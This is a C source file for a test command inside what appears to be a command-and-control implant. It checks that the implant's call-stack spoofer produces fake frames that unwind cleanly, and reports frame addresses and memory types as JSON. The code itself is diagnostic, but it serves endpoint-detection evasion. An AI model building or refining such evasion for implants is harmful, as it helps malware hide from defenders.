#include "config.h"
#ifdef INCLUDE_CMD_SPOOF_TEST

// TEMPORARY verification command - DO NOT SHIP in a default build. Its only
// purpose is to prove the callstack spoofer's fake frames unwind correctly:
// it runs a spoofed call to a probe that captures the walked stack from
// INSIDE the spoofed window and reports each frame's memory type.

#include "commands.h"
#include "evasion/callstack_spoof.h"
#include "json_out.h"

VOID cmd_spooftest(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    if (!inst->bCallstackSpoofInit) {
        package_add_string(inst, response, XSTR("spoofer not initialized"));
        response->is_error = TRUE;
        return;
    }

    // baseline: DIRECT call (no spoof) - shows what the walk does through the
    // agent's own frames alone
    callstack_spoof_verify(inst, FALSE);
    DWORD direct_count = inst->GhostSpoofer.ProbeCount;
    PVOID direct_f0 = inst->GhostSpoofer.ProbeFrames[0];

    BOOL ok = callstack_spoof_verify(inst, TRUE);
    PGHOST_SPOOFER pS = &inst->GhostSpoofer;

    // JSON: {"ok":b,"count":n,"frames":[{"a":"0x...","t":"I|P|M|?","m":"tag"},...]}
    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"ok\":");
    j_append_bool(&jb, ok);
    j_append_raw(&jb, ",\"count\":");
    j_append_uint(&jb, pS->ProbeCount);
    j_append_raw(&jb, ",\"unwind_reg\":");
    j_append_uint(&jb, inst->dwUnwindRegResult);
    j_append_raw(&jb, ",\"lookup_entry\":");
    j_append_uint(&jb, (DWORD)(pS->LookupEntry & 0xFFFFFFFF));
    j_append_raw(&jb, ",\"lookup_base\":");
    j_append_uint(&jb, (DWORD)(pS->LookupBase & 0xFFFFFFFF));
    j_append_raw(&jb, ",\"vunwind_rip\":");
    {
        const char* hex2 = "0123456789abcdef";
        char rb[19]; UINT64 v = pS->VUnwindNextRip;
        rb[0]='0'; rb[1]='x';
        for (int b = 60, k = 2; b >= 0; b -= 4) rb[k++] = hex2[(v >> b) & 0xF];
        rb[18] = 0; j_append_str(&jb, rb);
    }
    j_append_raw(&jb, ",\"vunwind_rsp\":");
    {
        const char* hex2 = "0123456789abcdef";
        char rb[19]; UINT64 v = pS->VUnwindNextRsp;
        rb[0]='0'; rb[1]='x';
        for (int b = 60, k = 2; b >= 0; b -= 4) rb[k++] = hex2[(v >> b) & 0xF];
        rb[18] = 0; j_append_str(&jb, rb);
    }
    j_append_raw(&jb, ",\"walkfc\":");
    j_append_uint(&jb, pS->WalkFrameChainCount);
    j_append_raw(&jb, ",\"direct_count\":");
    j_append_uint(&jb, direct_count);
    j_append_raw(&jb, ",\"direct_f0\":");
    {
        const char* hex2 = "0123456789abcdef";
        char rb[19];
        UINT64 v = (UINT64)direct_f0;
        rb[0]='0'; rb[1]='x';
        for (int b = 60, k = 2; b >= 0; b -= 4) rb[k++] = hex2[(v >> b) & 0xF];
        rb[18] = 0;
        j_append_str(&jb, rb);
    }
    j_append_raw(&jb, ",\"frames\":[");

    const char* hex = "0123456789abcdef";
    char abuf[19];
    const char tmap[5] = {'?', 'I', 'P', 'M', '?'};
    for (DWORD i = 0; i < pS->ProbeCount; i++) {
        if (i) j_append_raw(&jb, ",");
        UINT64 a = (UINT64)pS->ProbeFrames[i];
        int k = 0;
        abuf[k++] = '0'; abuf[k++] = 'x';
        for (int b = 60; b >= 0; b -= 4) abuf[k++] = hex[(a >> b) & 0xF];
        abuf[k] = 0;

        char t = '?';
        if (pS->ProbeTypes[i] == 0x1000000) t = 'I';       // MEM_IMAGE
        else if (pS->ProbeTypes[i] == 0x20000) t = 'P';    // MEM_PRIVATE
        else if (pS->ProbeTypes[i] == 0x40000) t = 'M';    // MEM_MAPPED

        const char* tag = "other";
        if (pS->ProbeBases[i] == pS->KernelBase) tag = "KernelBase";
        else if (pS->ProbeBases[i] == inst->Modules.Kernel32) tag = "kernel32";
        else if (pS->ProbeBases[i] == inst->Modules.Ntdll) tag = "ntdll";

        j_append_raw(&jb, "{\"a\":");
        j_append_str(&jb, abuf);
        j_append_raw(&jb, ",\"t\":\"");
        char tb[2] = { t, 0 };
        j_append_raw(&jb, tb);
        j_append_raw(&jb, "\",\"m\":");
        j_append_str(&jb, tag);
        j_append_raw(&jb, "}");
    }
    j_append_raw(&jb, "],\"rsp\":");
    {
        const char* hex2 = "0123456789abcdef";
        char rb[19];
        UINT64 v = pS->ProbeRsp;
        rb[0]='0'; rb[1]='x';
        for (int b = 60, k = 2; b >= 0; b -= 4) rb[k++] = hex2[(v >> b) & 0xF];
        rb[18] = 0;
        j_append_str(&jb, rb);
    }
    j_append_raw(&jb, ",\"stack\":[");
    for (int i = 0; i < 48; i++) {
        if (i) j_append_raw(&jb, ",");
        const char* hex2 = "0123456789abcdef";
        char sb[19];
        UINT64 v = pS->ProbeStack[i];
        sb[0]='0'; sb[1]='x';
        for (int b = 60, k = 2; b >= 0; b -= 4) sb[k++] = hex2[(v >> b) & 0xF];
        sb[18] = 0;
        j_append_str(&jb, sb);
    }
    j_append_raw(&jb, "]}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
